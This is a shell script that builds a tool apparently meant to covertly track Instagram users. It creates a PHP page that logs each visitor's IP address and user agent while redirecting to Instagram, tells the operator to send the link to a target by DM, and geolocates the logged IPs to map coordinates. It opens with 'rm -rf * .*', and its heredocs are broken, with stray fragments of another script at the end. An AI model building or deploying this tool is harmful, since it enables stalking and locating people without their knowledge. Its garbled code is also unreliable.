cd ~/Daesh-Insta

# 🔥 COMPLETE CLEAN REBUILD 🔥
rm -rf * .*

# 1. Main Tool: daesh_insta.sh
cat > daesh_insta.sh << 'EOF'
#!/bin/bash
# 🔥 DAESH INSTA v2.0 - Created by Taym Allah 🔥
# 📍 Instagram IP Tracker | Termux & Kali Linux

RED='\e[31m'; GREEN='\e[32m'; YELLOW='\e[33m'; BLUE='\e[34m'; PURPLE='\e[35m'; NC='\e[0m'

show_banner() {
    clear
    echo -e "${PURPLE}"
    echo "  ██████╗██╗  ██╗███████╗    ██╗  ██╗███████╗███╗   ███╗███████╗"
    echo "  ██╔══██╗██║  ██║██╔════╝    ██║  ██║██╔════╝████╗ ████║██╔════╝"
    echo "  ██████╔╝███████║█████╗      ███████║█████╗  ██╔████╔██║█████╗  "
    echo "  ██╔══██╗██╔══██║██╔══╝      ██╔══██║██╔══╝  ██║╚██╔╝██║██╔══╝  "
    echo "  ██║  ██║██║  ██║███████╗    ██║  ██║███████╗██║ ╚═╝ ██║███████╗"
    echo "  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚══════╝"
    echo -e "${NC}"
    echo -e "${GREEN}📱 Daesh Insta - Created by Taym Allah | 📍 Instagram IP Tracker${NC}"
    echo -e "${YELLOW}══════════════════════════════════════════════════════════════${NC}"
}

if [ $# -eq 0 ]; then
    show_banner
    echo -e "${RED}Usage:${NC} $0 @instagram_username"
    echo -e "${GREEN}Example:${NC} $0 @taym2_011"
    exit 1
fi

TARGET="$1"
show_banner
echo -e "${GREEN}[+] 🎯 Target Locked: $TARGET${NC}\n"

# Step 1: Profile Recon
echo -e "${BLUE}[1/4] 🔍 Profile Recon...${NC}"
curl -s "https://www.instagram.com/$TARGET/" -o /dev/null -w "%{http_code}\n" | grep -q "200" && echo -e "   ✅ Profile Found" || echo -e "   ⚠️  Profile Private/Not Found"

# Step 2: Deploy IP Logger
echo -e "${BLUE}[2/4] 🕷️  Deploying Daesh Logger...${NC}"
cat > ipgrab.php << 'EOF'
<?php
header("Location: https://www.instagram.com");
$ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
$ua = substr($_SERVER["HTTP_USER_AGENT"] ?? "Unknown", 0, 50);
$time = date("Y-m-d H:i:s");
$log = "[$time] IP: $ip | UA: $ua | Target: Daesh Insta\n";
file_put_contents("visitors.log", $log, FILE_APPEND);
echo "<h1>Redirecting to Instagram...</h1>";
?>
EOF

# Start PHP Server
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
PHP_PID=$!
sleep 2

LOCAL_URL="http://127.0.0.1:8080/ipgrab.php"
PUBLIC_URL="USE_NGROK: ngrok http 8080"

echo -e "${GREEN}   ✅ Logger Deployed!"
echo -e "   🔗 ${YELLOW}Local:${NC} $LOCAL_URL"
echo -e "   🌐 ${YELLOW}Public:${NC} Run: ${BLUE}ngrok http 8080${NC}\n"

# Step 3: Monitor Setup
echo -e "${BLUE}[3/4] 👁️  Live Monitoring Ready${NC}"
echo -e "${GREEN}   📁 Logs:${NC} visitors.log"
echo -e "   🔄 ${BLUE}./daesh_insta.sh monitor${NC} (live tail)\n"

# Step 4: Geolocator Ready
echo -e "${BLUE}[4/4] 📍 Geolocator Active${NC}"
echo -e "${GREEN}   🌍 ${BLUE}./daesh_insta.sh geo IP_ADDRESS${NC}\n"

echo -e "${PURPLE}🎮 Daesh Insta Ready! Send DM with tracking link!${NC}"
echo -e "${YELLOW}Press Ctrl+C to keep server running...${NC}"

# Cleanup trap
trap "kill $PHP_PID 2>/dev/null; echo -e '\n${GREEN}[+] Server Stopped${NC}'; exit" INT TERM

wait $PHP_PID
EOF

# 2. PHP Logger: ipgrab.php
cat > ipgrab.php << 'EOF'
<?php
header("Location: https://www.instagram.com");
$ip = $_SERVER["REMOTE_ADDR"] ?? "Unknown";
$ua = substr($_SERVER["HTTP_USER_AGENT"] ?? "Unknown", 0, 50);
$time = date("Y-m-d H:i:s");
$log = "[$time] IP: $ip | UA: $ua | Target: Daesh Insta\n";
file_put_contents("visitors.log", $log, FILE_APPEND);
echo "<h1 style='text-align:center;margin-top:20%;color:#262626'>Redirecting to Instagram...</h1>";
?>
EOF

# 3. Geolocator: geolocate_ip.sh
cat > geolocate_ip.sh << 'EOF'
#!/bin/bash
IP="$1"
if [ -z "$IP" ]; then
    echo "Usage: $0 IP_ADDRESS"
    exit 1
fi

echo "📍 Geolocating $IP..."
GEO=$(curl -s "http://ip-api.com/json/$IP?fields=lat,lon,city,country,isp")
LAT=$(echo "$GEO" | grep -o '"lat":[^,}]*' | cut -d: -f2 | tr -d ' ')
LON=$(echo "$GEO" | grep -o '"lon":[^,}]*' | cut -d: -f2 | tr -d ' ')
CITY=$(echo "$GEO" | grep -o '"city":"[^"]*"' | cut -d'"' -f4)

echo "🏙️  $CITY"
echo "📍 $LAT, $LON"
echo "🗺️  https://maps.google.com/?q=$LAT,$LON"
EOF

# 4. Map Plotter: plot_map.py
cat > plot_map.py << 'EOF'
print("📍 Daesh Insta Map - No locations yet")
print("Send tracking link first, then run this!")
EOF

# 5. Installer: install.sh
cat > install.sh << 'EOF'
#!/bin/bash
echo "🔥 Installing Daesh Insta..."
pkg install php curl jq -y || sudo apt install php curl jq -y
chmod +x *.sh *.py
echo "✅ Ready! ./daesh_insta.sh @target"
EOF

# 6. README.md
cat > README.md << 'EOF'
# 🔥 Daesh Insta

**Created by Taym Allah**

## Quick Start
```bash
chmod +x *.sh
./daesh_insta.sh @username
EOF
        echo "$ip|$city|$country|$lat|$lon|$isp" >> ip_locations.txt
    else
        echo -e "${RED}❌ Invalid IP or blocked${NC}"
    fi
}

monitor_logs() {
    echo -e "${BLUE}[👀] Monitoring visitors.log (Ctrl+C to stop)${NC}"
    tail -f visitors.log
}

main() {
    banner
    install_deps
    
    if [[ $# -eq 0 ]]; then
        echo -e "${RED}Usage: $0 @instagram_username${NC}"
        exit 1
    fi
    
    track_target "$1"
    setup_server
    
    echo -e "\n${GREEN}🎮 Commands:${NC}"
    echo "   watch logs:     $0 monitor"
    echo "   geolocate IP:   $0 geo 8.8.8.8"
    echo "   plot map:       $0 map"
    
    echo -e "\n${PURPLE}🚀 Deployed! Check visitors.log for IPs${NC}"
}

case "$1" in
    "monitor") monitor_logs ;;
    "geo") geolocate "$2" ;;
    "map") 
        echo "📍 Plotting map..."
        python3 plot_map.py 2>/dev/null || python plot_map.py ;;
    *) main "$@" ;;
